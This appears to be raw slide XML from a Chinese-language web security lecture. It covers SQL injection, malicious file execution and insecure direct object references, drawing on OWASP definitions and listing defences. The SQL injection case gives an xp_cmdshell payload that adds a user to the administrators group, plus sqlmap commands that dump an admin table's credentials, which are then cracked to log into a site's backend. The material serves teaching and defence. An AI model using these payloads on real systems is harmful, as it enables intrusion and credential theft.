          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>下面，将增加的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>test</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>用户加入到管理员组。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>链接为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>http://26.28.249.154/asd/wyqy/shownews.asp?id=51;exec master..</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>xp_cmdshell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t> 'net </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>localgroup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t> administrators test /add'--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>，返回结果如图</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>10-7</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>所示。从图中可以看出，页面正常返回，说明添加成功。</a:t>
            </a:r>
          </a:p>
          <a:p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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>注入：案例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="图像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0162" y="3733799"/>
            <a:ext cx="6967538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58813" y="1554163"/>
            <a:ext cx="7772400" cy="4608512"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>一般来说，只要是带有参数的动态网页且此网页访问了数据库，那么该页面就有可能存在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>注入漏洞。如果程序员安全意识不强，没有过滤输入的一些特殊字符，则存在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>注入的可能性就非常大。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>在探测过程中，需要分析服务器返回的详细错误信息。而在默认情况下，浏览器仅显示“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>HTTP 500</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>服务器错误”，并不显示详细的错误信息。为此，需要调整</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>IE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>浏览器的配置，即把</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>IE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>菜单【工具】中【</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Internet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>选项】下的高级选项中的【显示友好</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>错误信息】前面的勾去掉。</a:t>
            </a:r>
          </a:p>
          <a:p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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>注入：检测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54038" y="1354137"/>
            <a:ext cx="7772400" cy="4579937"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>在形如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>http://xxx.xxx.xxx/abc.asp?id=XX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>的带有参数的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>ASP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>动态网页中，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>XX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>为参数。参数的个数和类型取决于具体的应用。参数的类型可以是整型或者字符串型。下面我们以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>http://xxx.xxx.xxx/abc.asp?id=YY</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>为例进行分析。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>、整型参数时的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>注入漏洞探测</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>、字符串型参数时的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>注入漏洞探测</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>、特殊情况的处理</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>注入：检测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Sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="0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0765" y="2238057"/>
            <a:ext cx="7103110" cy="2295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1188" y="1287463"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>检测注入点是否可用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t> sqlmap.py -u http://10.0.0.22/nanfang/ProductShow.asp?ID=56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Sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="1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6882" y="2833687"/>
            <a:ext cx="5271135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2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>列出数据库表</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>sqlmap.py -u "http://10.0.0.22/nanfang/ProductShow.asp?ID=56" –tables</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p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Sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="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9207" y="3284537"/>
            <a:ext cx="6655118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3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>列出指定表中的字段</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>sqlmap.py -u "http://10.0.0.22/nanfang/ProductShow.asp?ID=56" -T admin –columns</a:t>
            </a:r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Sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="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1107" y="3269932"/>
            <a:ext cx="6845618" cy="2292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58813" y="1401763"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>列出表记录</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>sqlmap.py -u "http://10.0.0.22/nanfang/ProductShow.asp?ID=56" -T admin -C "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>id,data,username,password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>" –dump</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p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Sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="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7275" y="3678555"/>
            <a:ext cx="7229475" cy="1855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58813" y="1554162"/>
            <a:ext cx="7772400" cy="4522787"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>5. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>验证结果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>从图</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>10-12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>所示的结果可以发现其中的一个用户信息为：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>　　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>　　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>username: admin</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>　　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>password: 3acdbb255b45d296</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>md5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>反查 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>(http://www.cmd5.com/)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>，得到该</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>散列的原文密码为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>”0791idc”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>。 拿到管理员账号密码直接成功登录网站后台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Sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="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6432" y="1309052"/>
            <a:ext cx="5271135" cy="4239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防御注入漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/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8812" y="1392238"/>
            <a:ext cx="7951787" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>特定语言的库函数</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>来代替</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令和系统调用；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>对用户输入的信息进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>严格检查和过滤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数据类型（字符串、整数等）正确吗？ </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>使用的是允许的字符集吗？ </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>输入满足格式要求吗？ </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>……</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>使用“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>最小权限</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>”限制数据库用户的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>权限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9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9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9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9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9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9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9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9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9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9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9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9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9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9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（三）恶意文件执行</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4177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435975" cy="424973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Code vulnerable to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>remote file inclusion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> (RFI) allows attackers to include hostile code and data, resulting in devastating attacks, such as total server compromise.  Malicious file execution attacks affect PHP, XML and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>any framework which accepts filenames or files from users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"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417797" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="515938" y="1301750"/>
            <a:ext cx="3763962" cy="579438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20000"/>
              </a:spcBef>
              <a:buFont typeface="Webdings" panose="05030102010509060703" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>OWASP Definition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7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恶意文件执行</a:t>
            </a:r>
          </a:p>
        </p:txBody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8812" y="1411288"/>
            <a:ext cx="7989887" cy="4779962"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>恶意文件执行漏洞也称为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>不安全的远程文件包含漏洞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需要用户提供输入文件名的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>程序容易受到攻击：如果对用户输入不验证，攻击者可借此操控</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>程序执行系统程序或外部</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>URL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允许上传文件给</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>程序带来的危害更</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>大</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>可以将可执行代码放置到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>应用中去；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>可以替换掉</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>文件、日志文件或认证令牌。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8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8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防御恶意文件执行漏洞</a:t>
            </a:r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禁止用户输入被用作输入文件片断；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>对于必须要用户输入文件名、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>的地方，执行严格的检查验证输入合法性；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>文件上传的处理要非常小心：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>文件只允许上传到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>webroot</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>目录以外的目录中，这样能防止文件被执行；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>限制或隔离</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>程序对文件的访问权限。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（四）不安全的直接对象引用</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="3600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4188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435975" cy="424973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A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>direct object reference</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> occurs when a developer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>exposes a reference to an internal implementation object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>, such as a file, directory, database record, or key, as a URL or form parameter. Attackers can manipulate those references to access other objects without authorization.</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="418821" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="515938" y="1330325"/>
            <a:ext cx="3763962" cy="579438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20000"/>
              </a:spcBef>
              <a:buFont typeface="Webdings" panose="05030102010509060703" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>OWASP Definition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8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不安全的直接对象引用</a:t>
            </a:r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8813" y="1554163"/>
            <a:ext cx="7923212" cy="4532312"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>不安全的直接对象引用漏洞也常称为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
